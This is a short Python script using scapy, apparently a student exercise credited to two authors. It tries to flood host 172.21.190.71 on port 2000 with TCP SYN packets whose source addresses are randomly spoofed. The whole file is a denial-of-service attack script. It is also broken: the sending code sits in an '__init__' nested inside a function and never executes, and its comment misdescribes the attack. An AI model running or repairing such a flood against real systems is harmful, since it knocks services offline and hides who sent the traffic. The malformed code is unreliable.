#Henrique Haji
#Thauany Moedano

import socket, random, sys, threading
from scapy.all import *

total = 0

#Usando a biblioteca scapy, cria uma conexão TCP e envia a mensagem sem fechar a conexão
def sendSYN():
	ip = "172.21.190.71"
	porta = 2000
	def __init__(self):
		i = IP()
		i.src = "%i.%i.%i.%i" % (random.randint(1,254),random.randint(1,254),random.randint(1,254),random.randint(1,254))
		i.dst = ip

		t = TCP()
		t.sport = random.randint(1,65535)
		t.dport = porta
		t.flags = 'S'

		send(i/t, verbose=0)
		print(total)

if __name__ == "__main__":
    while 1:
        sendSYN()
        total += 1
